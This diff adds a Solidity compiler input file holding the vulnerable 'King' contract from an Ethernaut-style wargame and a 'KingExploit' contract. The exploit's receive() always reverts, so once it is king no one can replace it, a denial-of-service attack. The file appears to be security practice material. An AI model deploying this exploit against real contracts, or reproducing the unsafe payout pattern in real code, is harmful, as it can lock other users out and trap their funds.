@@ -1,0 +1,35 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/King.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract King {\n    address king;\n    uint public prize;\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n        king = msg.sender;\n        prize = msg.value;\n    }\n\n    receive() external payable {\n        require(msg.value >= prize || msg.sender == owner);\n        payable(king).transfer(msg.value);\n        king = msg.sender;\n        prize = msg.value;\n    }\n\n    function _king() public view returns (address) {\n        return king;\n    }\n}\n\ncontract KingExploit {\n    constructor() payable {}\n\n    function sendFunds(address receiver, uint256 amount) external {\n        require(amount <= address(this).balance, \"insufficient balance\");\n        (bool success, ) = payable(receiver).call{value: amount}(\"\");\n        require(success, \"payment failed\");\n    }\n\n    receive() external payable {\n        revert(\"transfer error\");\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
